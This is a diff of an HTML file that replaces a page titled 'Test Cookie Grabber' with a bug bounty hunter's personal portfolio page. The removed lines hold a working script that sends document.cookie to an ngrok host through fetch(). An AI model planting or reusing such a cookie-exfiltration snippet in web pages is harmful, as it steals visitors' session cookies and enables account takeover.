@@ -1,13 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Test Cookie Grabber</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Hasnain | Bug Bounty Hunter</title>
+    <link rel="stylesheet" href="./css/styles.css">
+    <link rel="icon" type="images/x-icon" href="./images/logo.png">
+    <style>
+        html {
+            scroll-behavior: smooth;
+        }
+    </style>
 </head>
 <body>
-  <script>
-    fetch("https://0ad3-2401-ba80-ac07-3e0e-8aea-7aa4-c53a-92ea.ngrok-free.app/?cookie=" + document.cookie)
-      .then(response => console.log("Request Sent"))
-      .catch(error => console.error("Error:", error));
-  </script>
+    <header>
+        <div class="logo">
+            <a href="https://mhasnain00.github.io/"><img src="./images/logo.png" alt="Hasnain Logo"></a>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#about">About</a></li>
+                <li><a href="#projects">Projects</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Home Section -->
+    <section id="home" class="home">
+        <div class="content">
+            <h1>Hello! This is Hasnain</h1>
+            <p>I am a professional <strong>Bug Bounty Hunter</strong> and a security enthusiast with experience in identifying vulnerabilities. I also program in <strong>Python</strong> and <strong>C++</strong>.</p>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="about">
+        <div class="content">
+            <h2>Who I am ?</h2>
+            <p style="text-align: left;">I am Hasnain, a passionate bug bounty hunter and security researcher. 
+                My primary focus is identifying security vulnerabilities across various platforms and web applications, leveraging a deep understanding of security testing methodologies and exploitation techniques.
+                With experience in penetration testing and ethical hacking, I specialize in discovering and responsibly reporting flaws such as SQL injections, XSS, CSRF, and other OWASP Top 10 vulnerabilities.</p>
+
+                <p style="text-align: left;">As a programmer, my expertise in Python allows me to automate repetitive tasks, develop custom tools for security testing, and implement efficient algorithms for data processing. In C++, I excel at building performance-critical applications, optimizing code for memory and speed, and developing low-level system tools.
+                My ability to integrate programming with my security expertise enhances my bug hunting, enabling precise testing and exploit development.</p>
+                
+               <p style="text-align: left;">Combining technical proficiency in programming and security, I am dedicated to improving software integrity and security for a safer digital landscape. 
+            </p>
+        </div>
+    </section>
+    
+    <!-- Projects Section -->
+    <section id="projects" class="projects">
+        <div class="content">
+            <h2>Projects</h2>
+            <ul style="text-align: left;">
+                <li>Bug Bounty Reports: Successfully identified and reported critical vulnerabilities for multiple organizations.</li>
+                <li>Python Projects   : Developed tools for vulnerability scanning and automation.</li>
+                <li>C++ Projects      : Built performance-efficient programs for data analysis and system automation.</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact">
+        <div class="content">
+            <h2>Contact Me</h2>
+            <p>Email: <a href="mailto:MuhammadHasnainGct@gmail.com">MuhammadHasnainGct@gmail.com</a></p>
+            <p>Phone: <a href="tel:+923048412972">+92 304 8412972</a></p>
+            <div class="social-links">
+                <a href="https://linkedin.com/in/mhasnain000/" target="_blank">LinkedIn</a>
+                <a href="https://instagram.com/mhasnain000" target="_blank">Instagram</a>
+                <a href="https://twitter.com/mhasnain000" target="_blank">Twitter</a>
+                <a href="https://github.com/mhasnain00" target="_blank">Github</a>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>© 2024 Hasnain. All Rights Reserved.</p>
+    </footer>
 </body>
 </html>
